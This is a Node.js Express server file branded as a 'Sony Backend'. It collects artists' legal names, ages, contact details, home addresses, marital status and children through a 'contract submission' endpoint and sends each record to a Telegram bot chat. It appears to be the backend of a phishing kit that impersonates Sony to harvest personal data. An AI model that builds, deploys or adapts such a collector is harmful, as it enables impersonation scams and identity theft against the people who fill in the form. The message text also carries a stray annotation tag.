require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 10000;

// SET THESE IN RENDER DASHBOARD
const BOT_TOKEN = process.env.BOT_TOKEN;
const SUPERVISOR_CHAT_ID = process.env.SUPERVISOR_CHAT_ID;

app.use(cors({ origin: "*" }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  res.send(`<h1>Sony Backend Live</h1><p>POST to /api/forward-to-telegram</p>`);
});

app.get("/health", (req, res) => res.send("OK"));

app.post("/api/forward-to-telegram", async (req, res) => {
  try {
    const { artistName, legalName, age, email, phone, address, married, kids, kidsNum, region, contractId } = req.body;

    if (!artistName || !legalName) {
      return res.status(400).json({ error: "Missing fields" });
    }

    const text = `
🎤 *NEW 【entity-SONY¦canonical_name=Sony】 CONTRACT SUBMISSION* 🎤
━━━━━━━━━━━━━━━━━━━━
👤 *Artist:* ${artistName}
📛 *Legal Name:* ${legalName}
🎂 *Age:* ${age}
📧 *Email:* ${email}
📱 *Phone:* ${phone}
🏠 *Address:* ${address}
💍 *Married:* ${married}
👶 *Kids:* ${kids} ${kidsNum && kidsNum !== '0' ? '('+kidsNum+')' : ''}
🌍 *Country:* ${region}
🆔 *Contract ID:* \`${contractId}\`
⏰ *Time:* ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━
✅ Verified via portal
`;

    if (!BOT_TOKEN || !SUPERVISOR_CHAT_ID) {
      console.log("Missing env, logging only:", text);
      return res.json({ success: true, forwarded: false, note: "Set BOT_TOKEN and SUPERVISOR_CHAT_ID in Render" });
    }

    const tg = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: SUPERVISOR_CHAT_ID,
      text: text,
      parse_mode: "Markdown"
    });

    console.log("Sent to Telegram:", tg.data.ok);
    res.json({ success: true, forwarded: true });

  } catch (e) {
    console.error(e.response?.data || e.message);
    res.status(500).json({ error: "Failed", details: e.response?.data || e.message });
  }
});

app.listen(PORT, () => console.log(`Sony bot running on ${PORT}`));